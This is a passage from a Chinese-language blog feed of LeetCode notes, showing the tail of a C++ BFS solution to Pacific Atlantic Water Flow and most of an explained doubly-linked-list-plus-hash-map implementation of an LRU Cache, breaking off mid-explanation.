class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">4</span>; k++)&#123;</span><br><span class="line">                <span class="type">int</span> subRow = current.first + offsetRow[k];</span><br><span class="line">                <span class="type">int</span> subCol = current.second + offsetCol[k];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(subRow &gt;=<span class="number">0</span> &amp;&amp; subRow &lt; heights.<span class="built_in">size</span>() &amp;&amp; subCol &gt;=<span class="number">0</span> &amp;&amp; subCol &lt; heights[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp; heights[current.first][current.second] &lt;= heights[subRow][subCol] &amp;&amp; !ocean[subRow][subCol])&#123;</span><br><span class="line">                    ocean[subRow][subCol] = <span class="literal">true</span>;</span><br><span class="line">                    q.<span class="built_in">push</span>(&#123;subRow, subCol&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">pacificAtlantic</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; heights) &#123;</span><br><span class="line">        <span class="type">int</span> m = heights.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = heights[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">pacific</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">atlantic</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; pacificQueue;</span><br><span class="line">        queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; atlanticQueue;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// init the pacific edge</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m; i++)&#123;</span><br><span class="line">            pacificQueue.<span class="built_in">push</span>(&#123;i,<span class="number">0</span>&#125;);</span><br><span class="line">            atlanticQueue.<span class="built_in">push</span>(&#123;i,n<span class="number">-1</span>&#125;);</span><br><span class="line">            pacific[i][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">            atlantic[i][n<span class="number">-1</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//init the atlantic edge</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)&#123;</span><br><span class="line">            pacificQueue.<span class="built_in">push</span>(&#123;<span class="number">0</span>,i&#125;);</span><br><span class="line">            atlanticQueue.<span class="built_in">push</span>(&#123;m<span class="number">-1</span>,i&#125;);</span><br><span class="line">            pacific[<span class="number">0</span>][i] =<span class="literal">true</span>;</span><br><span class="line">            atlantic[m<span class="number">-1</span>][i] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Conduct BFS to PacificQueue</span></span><br><span class="line">        <span class="built_in">bfs</span>(pacificQueue, heights, pacific);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Conduct BFS to AtlanticQueue</span></span><br><span class="line">        <span class="built_in">bfs</span>(atlanticQueue, heights, atlantic);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Retrive the intersection of the two vectors.</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;m; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(pacific[i][j] &amp;&amp; atlantic[i][j]) result.<span class="built_in">push_back</span>(&#123;i,j&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在函數 <code>pacificAtlantic</code> 中首先定義了兩個2D陣列 <code>pacific</code>, <code>atlantic</code>，用來儲存從太平洋邊緣以及從大西洋邊緣進行BFS的走訪紀錄。以及各自行BFS 所需要的 queue <code>pacificQueue</code>, <code>atlanticQueue</code>，由於需要從邊緣作為起始點開始走訪，因此一開始會需要先將太平洋和大西洋的邊緣個別透過迴圈將其 Push 進入各自的 queue 中，並且需要更新對應在 <code>pacific</code> 以及 <code>atlantic</code>  中的拜訪紀錄，將對應位置標注為 <code>True</code>。接著呼叫兩次 <code>bfs</code> 並且 BFS 走訪結束後， <code>pacific</code>  以及 <code>atlantic</code> 中儲存的資料取交集，並添加到 <code>result</code> 中，最後回傳。</p><p><code>bfs</code> 的部分，首先參數的地方，會需要傳入所使用的 queue, 題目給的 <code>heights</code> 以及對應的走訪2D陣列。接著就是依序將 BFS 中 queue 的首端元素取出，這裡會是一個 <code>pair&lt;int, int&gt;</code> 型態的變數，接著就是要走訪當前單元格的上下左右單元格，若上下左右單元格還在島嶼範圍內， <strong>並且 <code>heights[current.first][current.second] &lt;= heights[subRow][subCol] &amp;&amp; !ocean[subRow][subCol]</code> 這裡代表當單元格小於其上下左右單元格，這裡的原因是因為我們是反向查找，水流要能夠從海拔高留到海拔低，但我們的搜尋起點會是從邊緣開始，因此我們需要找比當前儲存格還高，且未拜訪過的單元格</strong> ，一旦找到後就需要該單元格標注為已拜訪 (<code>ocean[subRow][subCol] = true;</code>) 並且將其也推入對應的 queue中之後繼續進行下一層的走訪。</p><p>所以總結來看會是，各自從大西洋和太平洋的邊緣進行BFS 走訪的紀錄取交集，就會是雨水能夠同時流到太平洋和大西洋的單元格了。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/417/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>時間複雜度</p><p>$O( m \times n )$ + $O( m \times n)$ &#x3D;  $O( m \times n)$</p><p>空間複雜度</p><p>$O( m \times n )$ + $O( m \times n)$ &#x3D; $O( m \times n)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> BFS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LRU 快取 | Medium | LeetCode#146. LRU Cache</title>
      <link href="/posts/d5aafc8e.html"/>
      <url>/posts/d5aafc8e.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/146/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目描述： 題目要求設計一套結構能夠滿足 [LRU(Least Recently Used) Cache])(<a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#LRU">https://en.wikipedia.org/wiki/Cache_replacement_policies#LRU</a>)</li></ul><div class="note info flat"><p>題目要求實踐 <code>LRUCache</code> class：</p><ul><li><code>LRUCache(capacity)</code>: 使用 <code>capacity</code> 初始化 LRUCache 大小</li><li><code>int get(int key)</code>: 如果 <code>key</code> 存在，則返回對應的值，若不存在則返回 -1</li><li><code>void put(int key, int value)</code>: 如果 <code>key</code> 存在，則更新它的值，否則添加 <code>key-value</code> pair 到 cache。若 key 的數量車超出 <code>capacity</code> 大小，則逐出最近最少使用的Key</li></ul></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題因為很偏系統設計，所以剛接觸的時候反而沒太多想法，可以知道的是大多做法都是使用 <strong>doubly linked list 搭配 Hash Table 去進行實作</strong> ，而為什麼要是這樣做，主要是因為這個結構在搜尋特定的 key 是否存在這樣可以達到 $O(1)$ 的時間複雜度，而如果用 Queue 或是Stack 這種只能單向進出的結構，會讓搜尋時的複雜度提高到 $O(n)$</p><p><img src="/img/LeetCode/146/LRU.png"></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> key, value;</span><br><span class="line">        Node *next, *prev;</span><br><span class="line">        <span class="built_in">Node</span>(): <span class="built_in">key</span>(<span class="number">0</span>), <span class="built_in">value</span>(<span class="number">0</span>) &#123;</span><br><span class="line">            next = <span class="literal">nullptr</span>;</span><br><span class="line">            prev = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">Node</span>(<span class="type">int</span> k, <span class="type">int</span> v) : <span class="built_in">key</span>(k), <span class="built_in">value</span>(v)&#123;</span><br><span class="line">            next = <span class="literal">nullptr</span>;</span><br><span class="line">            prev = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">         <span class="built_in">Node</span>(<span class="type">int</span> k, <span class="type">int</span> v, Node *nNode, Node *pNode) : <span class="built_in">key</span>(k), <span class="built_in">value</span>(v)&#123;</span><br><span class="line">            next = nNode;</span><br><span class="line">            prev = pNode;</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> capacity;</span><br><span class="line">        Node *front, *tail, *currentPtr;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, Node*&gt;  cacheMap; <span class="comment">// &#123;Key, Node&#125;</span></span><br><span class="line">       </span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">moveToFront</span><span class="params">(Node* node)</span></span>&#123;</span><br><span class="line">           <span class="keyword">if</span>(node == front) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">           node-&gt;prev-&gt;next = node-&gt;next; <span class="comment">// skip current node, link the previous node&#x27;s next to current node&#x27;s next node</span></span><br><span class="line">           <span class="keyword">if</span>(node-&gt;next) node-&gt;next-&gt;prev = node-&gt;prev; <span class="comment">// skip current node, link the next node&#x27;s prev to current node&#x27;s prev node</span></span><br><span class="line">           <span class="keyword">else</span> tail = node-&gt;prev; <span class="comment">// if current node&#x27;s tail node, then update tail pointer to the previous node</span></span><br><span class="line"></span><br><span class="line">           node-&gt;next = front; <span class="comment">// Insert current node to the front</span></span><br><span class="line">           node-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line">           front -&gt; prev = node; <span class="comment">// Update front pointer</span></span><br><span class="line">           front = node;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove the lease recent use entry from the cache</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">removeTail</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(tail==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//update cacheMap</span></span><br><span class="line">            cacheMap.<span class="built_in">erase</span>(tail-&gt;key);</span><br><span class="line">            <span class="comment">//updae pointers</span></span><br><span class="line">            <span class="keyword">if</span>(tail-&gt;prev)&#123;</span><br><span class="line">                tail = tail-&gt;prev;</span><br><span class="line">                tail-&gt;next = <span class="literal">nullptr</span>; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                front = tail = <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;  </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span>: </span><br><span class="line">        <span class="built_in">LRUCache</span>(<span class="type">int</span> cap) : <span class="built_in">capacity</span>(cap), <span class="built_in">front</span>(<span class="literal">nullptr</span>), <span class="built_in">tail</span>(<span class="literal">nullptr</span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cacheMap.<span class="built_in">find</span>(key) != cacheMap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                Node *node = cacheMap[key];</span><br><span class="line">                <span class="comment">//update cache</span></span><br><span class="line">                <span class="built_in">moveToFront</span>(node);</span><br><span class="line">                <span class="keyword">return</span> node-&gt;value;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(cacheMap.<span class="built_in">find</span>(key) != cacheMap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                Node *node = cacheMap[key];</span><br><span class="line">                node-&gt;value = value;</span><br><span class="line">                <span class="built_in">moveToFront</span>(node);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123; <span class="comment">// Update to cache (1) Check if cache is full (2) add to cache</span></span><br><span class="line">                Node *newData = <span class="keyword">new</span> <span class="built_in">Node</span>(key, value);</span><br><span class="line">                <span class="keyword">if</span>(cacheMap.<span class="built_in">size</span>() == capacity)&#123;</span><br><span class="line">                    <span class="built_in">removeTail</span>(); <span class="comment">// Remove least recently used node</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(front==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">                    front = tail = newData;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    newData-&gt;next = front;</span><br><span class="line">                    front-&gt;prev = newData;</span><br><span class="line">                    front = newData;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//update cache map</span></span><br><span class="line">                cacheMap[key] = newData;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">LRUCache <span class="title">cache</span><span class="params">(<span class="number">2</span>)</span></span>; <span class="comment">// Capacity = 2</span></span><br><span class="line">    cache.<span class="built_in">put</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    cache.<span class="built_in">put</span>(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    cout &lt;&lt; cache.<span class="built_in">get</span>(<span class="number">1</span>) &lt;&lt; endl; <span class="comment">// Returns 1</span></span><br><span class="line">    cache.<span class="built_in">put</span>(<span class="number">3</span>, <span class="number">3</span>);              <span class="comment">// Evicts key 2</span></span><br><span class="line">    cout &lt;&lt; cache.<span class="built_in">get</span>(<span class="number">2</span>) &lt;&lt; endl; <span class="comment">// Returns -1 (not found)</span></span><br><span class="line">    cache.<span class="built_in">put</span>(<span class="number">4</span>, <span class="number">4</span>);              <span class="comment">// Evicts key 1</span></span><br><span class="line">    cout &lt;&lt; cache.<span class="built_in">get</span>(<span class="number">1</span>) &lt;&lt; endl; <span class="comment">// Returns -1 (not found)</span></span><br><span class="line">    cout &lt;&lt; cache.<span class="built_in">get</span>(<span class="number">3</span>) &lt;&lt; endl; <span class="comment">// Returns 3</span></span><br><span class="line">    cout &lt;&lt; cache.<span class="built_in">get</span>(<span class="number">4</span>) &lt;&lt; endl; <span class="comment">// Returns 4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡先定義用於作爲 Cache 結構的 doubly-linked list，需要先宣告 Node 的結構，這裡定義了一個 <code>Node</code> class，首先需要定義用於保存資料本身的 <code>key</code> 與 <code>value</code> ，接著定義指標，每個節點都需要指向其前一個節點與後一個節點，因此需要 <code>*prev</code> 和 <code>*next</code>。 然後就用 constructor 去定義當物件被初始化後的行為。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> key, value;</span><br><span class="line">        Node *next, *prev;</span><br><span class="line">        <span class="built_in">Node</span>(): <span class="built_in">key</span>(<span class="number">0</span>), <span class="built_in">value</span>(<span class="number">0</span>) &#123;</span><br><span class="line">            next = <span class="literal">nullptr</span>;</span><br><span class="line">            prev = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">Node</span>(<span class="type">int</span> k, <span class="type">int</span> v) : <span class="built_in">key</span>(k), <span class="built_in">value</span>(v)&#123;</span><br><span class="line">            next = <span class="literal">nullptr</span>;</span><br><span class="line">            prev = <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">         <span class="built_in">Node</span>(<span class="type">int</span> k, <span class="type">int</span> v, Node *nNode, Node *pNode) : <span class="built_in">key</span>(k), <span class="built_in">value</span>(v)&#123;</span><br><span class="line">            next = nNode;</span><br><span class="line">            prev = pNode;</span><br><span class="line">        &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接著就需要定義 <code>LRUCache</code> class 內部的實作，需要先定義出 Cache 的雛形，以下是變數說明</p><p><code>int capacity</code> 為 Cache 的容量大小</p><p><code>Node *front, *tail, *currentPtr</code> 宣告指標用來指向 doubly-linked list 當中的頭部，尾端，以及當前節點 <code>*currentPtr</code></p><p><code>unordered_map&lt;int, Node*&gt; cacheMap</code> 用來儲存 key-node pair，可以用來判斷資料是否有存取過</p><p>結著需要定義 Doublylinked list 的行為， <strong>LRU Cache 的特性是最常使用的的資料會被移動到 Front(Head) 而最少被使用的資料會移動到 Tail，當資料數量超出快取容量時，Tail會被逐出</strong> ，所以對應這個特性我們定義出兩個函數 <code>moveToFront</code> 以及 <code>removeTail</code> ，這裡介紹這兩個函數：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">moveToFront</span><span class="params">(Node* node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node == front) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    node-&gt;prev-&gt;next = node-&gt;next; <span class="comment">// skip current node, link the previous node&#x27;s next to current node&#x27;s next node</span></span><br><span class="line">    <span class="keyword">if</span>(node-&gt;next) node-&gt;next-&gt;prev = node-&gt;prev; <span class="comment">// skip current node, link the next node&#x27;s prev to current node&#x27;s prev node</span></span><br><span class="line">    <span class="keyword">else</span> tail = node-&gt;prev; <span class="comment">// if current node&#x27;s tail node, then update tail pointer to the previous node</span></span><br><span class="line"></span><br><span class="line">    node-&gt;next = front; <span class="comment">// Insert current node to the front</span></span><br><span class="line">    node-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line">    front -&gt; prev = node; <span class="comment">// Update front pointer</span></span><br><span class="line">    front = node;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先排除了單一節點的狀況，之後如果要將一個節點從一個 doubly-linked list 移動到他的頭部，需要將他上一個節點的 <code>next</code> 接到當前節點的下一個節點 (<code>node-&gt;prev-&gt;next = node-&gt;next</code>)，另外當前節點的下一個節點的 <code>prev</code> 需要接道當前節點的上一個節點 (<code>node-&gt;next-&gt;prev = node-&gt;prev</code>)。而如果當前節點正好就是 <code>tail</code> 那就將 <code>tail</code> 指標 update 成前一個節點。</p><p><img src="/img/LeetCode/146/double.png"></p><p>接著要去將當前節點移動到頭部，這時需要將當前節點的 <code>prev</code>指向 <code>null</code> 並且當前節點的 <code>next</code> 要先指到當前 <code>front</code> 節點，而 <code>front</code> 節點的 <code>prev</code> 會是我們新節點，最後再更當前節點為新的 <code>front</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">removeTail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tail==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//update cacheMap</span></span><br><span class="line">    cacheMap.<span class="built_in">erase</span>(tail-&gt;key);</span><br><span class="line">    <span class="comment">//updae pointers</span></span><br><span class="line">    <span class="keyword">if</span>(tail-&gt;prev)&#123;</span><br><span class="line">        tail = tail-&gt;prev;</span><br><span class="line">        tail-&gt;next = <span class="literal">nullptr</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        front = tail = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p><code>removeTail</code> 的部分，一樣如果當前沒有 <code>tail</code> 則返回，而移除步驟要先將 Hash Table 中對應的 TailEntry 移除，可以透過 <code>unordered_map</code> 中的 <code>erase</code> 方法來實現。而當接著要處理鏈結的部分，如果並非單一節點，則 <code>tail-prev</code> 存在，這樣就需要將當前的 tail 節點的前一個節點更新為新的 <code>tail</code> (<code>tail = tail-&gt;prev</code>) 而新的 <code>tail</code>節點的 <code>next</code> 就會是 <code>nullptr</code> 而如果是單一節點的狀況，那 <code>front</code> 與 <code>tail</code> 都會被移除，因此直接指定為    <code>nullptr</code></p><p>定義好 Cache 本身的更新行為後，可以來定義客戶端呼叫Cache 可以用的方法 <code>get</code> 和 <code>put</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cacheMap.<span class="built_in">find</span>(key) != cacheMap.<span class="built_in">end</span>())&#123;</span><br><span class="line">        Node *node = cacheMap[key];</span><br><span class="line">        <span class="comment">//update cache</span></span><br><span class="line">        <span class="built_in">moveToFront</span>(node);</span><br><span class="line">        <span class="keyword">return</span> node-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>get</code> 行為會先去從 Cache 中查看對應的值是否存在，這就是查找Hash Table <code>cacheMap</code> 如果有找到值，就透過一個指標 <code>*node</code> 指向該值在Table 中保存的記憶體位址 (<code>Node *node =cacheMap[key]</code>)，由於每次存取，節點都需要移動到 front，因此呼叫 <code>moveToFront</code> 方法，並且返回該 <code>node</code> 的 <code>value</code> 而若是沒在 cache 中找到為應資料就回傳 -1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cacheMap.<span class="built_in">find</span>(key) != cacheMap.<span class="built_in">end</span>())&#123;</span><br><span class="line">        Node *node = cacheMap[key];</span><br><span class="line">        node-&gt;value = value;</span><br><span class="line">        <span class="built_in">moveToFront</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">// Update to cache (1) Check if cache is full (2) add to cache</span></span><br><span class="line">        Node *newData = <span class="keyword">new</span> <span class="built_in">Node</span>(key, value);</span><br><span class="line">        <span class="keyword">if</span>(cacheMap.<span class="built_in">size</span>() == capacity)&#123;</span><br><span class="line">            <span class="built_in">removeTail</span>(); <span class="comment">// Remove least recently used node</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(front==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            front = tail = newData;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            newData-&gt;next = front;</span><br><span class="line">            front-&gt;prev = newData;</span><br><span class="line">            front = newData;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//update cache map</span></span><br><span class="line">        cacheMap[key] = newData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>put</code> 的部分，如果要insert資料，但是對應的資料已經存在於 